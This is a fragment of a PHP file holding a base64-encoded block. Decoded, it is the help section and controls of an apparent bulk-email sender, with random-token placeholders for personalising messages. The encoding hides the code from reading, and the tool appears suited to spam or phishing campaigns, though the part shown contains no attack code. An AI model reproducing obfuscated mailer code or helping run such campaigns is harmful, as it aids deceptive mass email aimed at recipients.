AgICAgICAgICA8bGk+Wy1yYW5kb21udW1iZXItXSA6IDxiPlJhbmRvbSBudW1iZXIgKDAtOSkgPC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21sZXR0ZXJzLV0gOiA8Yj5SYW5kb20gTGV0dGVycyhhLXopIDwvYj48L2xpPgogICAgICAgICAgICAgICAgPGxpPlstcmFuZG9tbWQ1LV0gOiA8Yj5SYW5kb20gTUQ1IDwvYj48L2xpPgogICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8aDQ+ZXhhbXBsZTwvaDQ+CiAgICAgICAgICAgIFJlY2l2ZXIgRW1haWwgPSA8Yj51c2VyQGRvbWFpbi5jb208L2I+PGJyPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+aGVsbG8gPGI+Wy1lbWFpbHVzZXItXTwvYj4gLT4gaGVsbG8gPGI+dXNlcjwvYj48L2xpPgogICAgICAgICAgICAgICAgPGxpPnlvdXIgY29kZSBpcyAgPGI+Wy1yYW5kb21tZDUtXTwvYj4gLT4geW91ciBjb2RlIGlzIDxiPmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNlPC9iPjwvbGk+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDxoNj5ieSA8Yj48YSBocmVmPSJodHRwOi8vPD9waHAgZWNobyAkb3dsWyd3ZWJzaXRlJ10/PiI+PD9waHAgZWNobyAkb3dsWyd3ZWJzaXRlJ10/PjwvYT48L2I+PC9oNj4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBpZD0icHJvZ3Jlc3MiIGNsYXNzPSJjb2wtbGctMTYiPgogICAgICAgICAgCiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KIAo8c2NyaXB0PgogJCgiI2J0blN0YXJ0IikuYXR0cigiZGlzYWJsZWQiLCBmYWxzZSk7CiAkKCIjYnRuU3RvcCIpLmF0dHIoImRpc2FibGVkIiwgdHJ1ZSk7Cjwvc2NyaXB0Pgo8L2JvZHk+Cjxmb290ZXI+PC9mb290ZXI+Cgo8L2h0bWw+"));?>